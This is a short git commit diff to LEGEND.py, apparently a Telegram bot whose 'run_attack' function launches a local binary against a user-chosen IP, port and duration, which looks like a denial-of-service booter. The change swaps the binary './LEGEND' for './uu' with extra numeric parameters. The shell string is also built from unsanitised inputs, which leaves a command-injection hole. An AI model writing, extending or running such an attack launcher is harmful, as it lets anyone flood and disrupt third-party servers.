3d3dc682e0979df8e524033d5da19f8aeea591d8
ninjajod12 <nofninja@gmail.com>
2025-03-09 22:38:14 +0530

    Update LEGEND.py

--- LEGEND.py
+++ LEGEND.py
@@ -23,7 +23,7 @@ async def start(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./LEGEND {ip} {port} {duration}",
+            f"./uu {ip} {port} {duration} 800 850 900 16",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
